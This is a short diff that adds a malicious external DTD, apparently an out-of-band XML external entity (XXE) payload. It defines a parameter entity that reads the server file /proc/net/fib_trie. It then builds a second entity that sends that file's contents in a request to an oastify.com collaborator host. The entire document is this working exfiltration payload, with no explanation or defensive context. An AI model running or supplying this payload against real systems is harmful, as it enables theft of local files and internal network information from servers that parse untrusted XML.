@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/net/fib_trie">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://vut1v00ks842015ozs8eyj2tokudi46t.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
